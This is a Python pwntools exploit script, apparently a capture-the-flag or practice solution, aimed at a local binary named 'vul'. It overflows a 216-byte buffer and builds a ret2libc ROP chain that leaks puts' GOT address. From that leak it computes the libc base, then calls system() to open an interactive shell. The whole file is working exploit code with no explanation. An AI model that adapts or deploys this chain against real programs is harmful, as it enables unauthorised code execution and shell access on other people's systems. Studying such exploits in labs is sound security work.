from pwn import *

puts_plt = 0x0401030
puts_got = 0x404018
main =  0x401060
bin = context.binary = ELF('./vul')
pop_rdi = bin.symbols.__libc_csu_init + 91 #address of pop rdi; gadget..
ret = bin.symbols._init + 22
context.os = "linux"
context.arch = "amd64"
vul = process("./vul")
junk = b'A'* 216
payload =  junk
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
vul.sendline(payload)
vul.recvuntil(b"\x0a")
leaked_add = u64(vul.recvline().strip().ljust(8, b'\00'))
log.success("Address of put@plt leaked " + hex(leaked_add))
#part 2
puts_glibc = 0x75e10
offset = leaked_add - puts_glibc
log.success("Base address of libc: " +  hex(offset))
system = 0x49860 + offset
arg = 0x198882 + offset
payload = junk +p64(pop_rdi) + p64(arg) + p64(system)
vul.sendline(payload)
vul.interactive()